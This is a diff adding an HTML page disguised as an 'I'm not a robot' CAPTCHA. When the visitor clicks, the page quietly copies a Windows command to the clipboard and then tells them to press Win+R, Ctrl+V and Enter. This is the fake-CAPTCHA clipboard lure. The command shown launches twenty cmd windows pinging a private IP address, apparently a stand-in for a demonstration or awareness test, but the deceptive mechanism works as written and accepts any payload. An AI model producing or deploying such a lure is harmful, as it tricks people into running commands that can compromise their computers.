@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Custom CAPTCHA with Verification Steps</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    .captcha-box {
+      display: inline-block;
+      padding: 30px;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      position: relative;
+    }
+    .captcha-button {
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .captcha-button:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+    .popup {
+      display: none;
+      position: absolute;
+      top: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+      margin-top: 15px;
+      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      padding: 15px;
+      border-radius: 8px;
+      width: 280px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: left;
+      font-size: 14px;
+    }
+    .popup ul {
+      padding-left: 20px;
+      margin: 0;
+    }
+    .popup li {
+      margin-bottom: 8px;
+    }
+    .key {
+      font-weight: bold;
+      background-color: #eee;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: Arial, sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div class="captcha-box">
+    <h2>Verify You Are Human</h2>
+    <p>Please verify that you are a human to continue.</p>
+    <button class="captcha-button" onclick="verifyHuman()">I'm not a robot</button>
+    <div id="popup" class="popup">
+      <strong>Verification Steps:</strong>
+      <ul>
+        <li>1. Press Windows Button <img src="Screenshot 2025-09-03 084838.png" alt="Windows Key" style="height:16px; vertical-align:middle;"> + <span class="key">R</span></li>
+        <li>2. Press <span class="key">CTRL</span> + <span class="key">V</span></li>
+        <li>3. Press <span class="key">Enter</span></li>
+      </ul>
+    </div>
+  </div>
+
+  <script>
+    function verifyHuman() {
+      const command = 'cmd /c "for /l %x in (1,1,20) do start cmd /k ping 172.16.0.168"';
+      navigator.clipboard.writeText(command).then(() => {
+        document.querySelector(".captcha-button").disabled = true;
+        document.getElementById("popup").style.display = "block";
+      }).catch(err => {
+        alert("❌ Failed to copy command.");
+        console.error("Clipboard error:", err);
+      });
+    }
+  </script>
+</body>
+</html>
